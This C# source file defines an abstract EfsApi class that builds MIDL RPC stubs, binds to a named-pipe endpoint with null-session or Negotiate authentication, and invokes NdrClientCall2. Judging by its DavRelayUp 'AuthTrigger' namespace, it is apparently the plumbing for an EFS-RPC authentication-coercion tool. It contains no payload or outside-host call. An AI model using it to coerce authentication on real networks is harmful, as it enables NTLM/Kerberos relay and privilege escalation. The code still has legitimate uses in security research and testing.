using System;
using System.Runtime.InteropServices;
using static DavRelayUp.AuthTrigger.NativeMethods;

namespace DavRelayUp.AuthTrigger
{
    public abstract class EfsApi
    {
        private byte[] MIDL_ProcFormatString;

        private byte[] MIDL_TypeFormatString;
        private GCHandle procString;
        private GCHandle formatString;
        private GCHandle stub;
        private GCHandle faultoffsets;
        private GCHandle clientinterface;
        private string PipeName;

        private allocmemory AllocateMemoryDelegate = AllocateMemory;
        private freememory FreeMemoryDelegate = FreeMemory;

        public UInt32 RPCTimeOut = 5000;

        protected void InitializeStub(Guid interfaceID, byte[] MIDL_ProcFormatString, byte[] MIDL_TypeFormatString, string pipe, ushort MajorVerson, ushort MinorVersion)
        {
            this.MIDL_ProcFormatString = MIDL_ProcFormatString;
            this.MIDL_TypeFormatString = MIDL_TypeFormatString;
            PipeName = pipe;
            procString = GCHandle.Alloc(this.MIDL_ProcFormatString, GCHandleType.Pinned);

            RPC_CLIENT_INTERFACE clientinterfaceObject = new RPC_CLIENT_INTERFACE(interfaceID, MajorVerson, MinorVersion);

            COMM_FAULT_OFFSETS commFaultOffset = new COMM_FAULT_OFFSETS();
            commFaultOffset.CommOffset = -1;
            commFaultOffset.FaultOffset = -1;
            faultoffsets = GCHandle.Alloc(commFaultOffset, GCHandleType.Pinned);
            clientinterface = GCHandle.Alloc(clientinterfaceObject, GCHandleType.Pinned);
            formatString = GCHandle.Alloc(MIDL_TypeFormatString, GCHandleType.Pinned);

            MIDL_STUB_DESC stubObject = new MIDL_STUB_DESC(formatString.AddrOfPinnedObject(),
                                                            clientinterface.AddrOfPinnedObject(),
                                                            Marshal.GetFunctionPointerForDelegate(AllocateMemoryDelegate),
                                                            Marshal.GetFunctionPointerForDelegate(FreeMemoryDelegate));

            stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);
        }

        protected void freeStub()
        {
            procString.Free();
            faultoffsets.Free();
            clientinterface.Free();
            formatString.Free();
            stub.Free();
        }

        private delegate IntPtr allocmemory(int size);

        protected static IntPtr AllocateMemory(int size)
        {
            IntPtr memory = Marshal.AllocHGlobal(size);
            return memory;
        }

        private delegate void freememory(IntPtr memory);

        protected static void FreeMemory(IntPtr memory)
        {
            Marshal.FreeHGlobal(memory);
        }

        //https://github.com/vletoux/pingcastle/blob/19a3890b214bff7cb66b08c55bb4983ca21c8bd1/RPC/rpcapi.cs#L224
        protected IntPtr Bind(IntPtr IntPtrserver, bool UseNullSession = false, string interfaceid = null)
        {
            string server = Marshal.PtrToStringUni(IntPtrserver);
            IntPtr bindingstring = IntPtr.Zero;
            IntPtr binding = IntPtr.Zero;
            Int32 status;

            status = RpcStringBindingCompose(interfaceid, "ncacn_np", server, PipeName, null, out bindingstring);
            if (status != 0)
            {
                Console.WriteLine("[x]RpcStringBindingCompose failed with status 0x" + status.ToString("x"));
                return IntPtr.Zero;
            }

            status = RpcBindingFromStringBinding(Marshal.PtrToStringUni(bindingstring), out binding);
            RpcBindingFree(ref bindingstring);
            if (status != 0)
            {
                Console.WriteLine("[x]RpcBindingFromStringBinding failed with status 0x" + status.ToString("x"));
                return IntPtr.Zero;
            }

            //Todo
            if (UseNullSession)
            {
                // note: windows xp doesn't support user or domain = "" => return 0xE
                SEC_WINNT_AUTH_IDENTITY identity = new SEC_WINNT_AUTH_IDENTITY();
                identity.User = "";
                identity.UserLength = identity.User.Length * 2;
                identity.Domain = "";
                identity.DomainLength = identity.Domain.Length * 2;
                identity.Password = "";
                identity.Flags = 2;

                RPC_SECURITY_QOS qos = new RPC_SECURITY_QOS();
                qos.Version = 1;
                qos.ImpersonationType = 3;
                GCHandle qoshandle = GCHandle.Alloc(qos, GCHandleType.Pinned);

                // 9 = negotiate , 10 = ntlm ssp
                status = RpcBindingSetAuthInfoEx(binding, server, 0, 9, ref identity, 0, ref qos);
                qoshandle.Free();
                if (status != 0)
                {
                    Console.WriteLine("[x]RpcBindingSetAuthInfoEx failed with status 0x" + status.ToString("x"));
                }
            }
            else
            {
                status = RpcBindingSetAuthInfo(binding, server, /* RPC_C_AUTHN_LEVEL_PKT_PRIVACY */ 6, /* RPC_C_AUTHN_GSS_NEGOTIATE */ 9, IntPtr.Zero, 0);
                if (status != 0)
                {
                    Console.WriteLine("[x]RpcBindingSetAuthInfo failed with status 0x" + status.ToString("x"));
                }
            }

            status = RpcBindingSetOption(binding, 12, new IntPtr(RPCTimeOut));
            if (status != 0)
            {
                Console.WriteLine("[x]RpcBindingSetOption failed with status 0x" + status.ToString("x"));
            }
            //Console.WriteLine("[!]binding ok (handle=" + binding.ToString("x") + ")");

            return binding;
        }

        protected IntPtr GetProcStringHandle(int offset)
        {
            return Marshal.UnsafeAddrOfPinnedArrayElement(MIDL_ProcFormatString, offset);
        }

        protected IntPtr GetStubHandle()
        {
            return stub.AddrOfPinnedObject();
        }

        protected IntPtr CallNdrClientCall2x86(int offset, params IntPtr[] args)
        {
            GCHandle stackhandle = GCHandle.Alloc(args, GCHandleType.Pinned);
            IntPtr result;
            try
            {
                result = NdrClientCall2x86(GetStubHandle(), GetProcStringHandle(offset), stackhandle.AddrOfPinnedObject());
            }
            finally
            {
                stackhandle.Free();
            }
            return result;
        }
    }
}
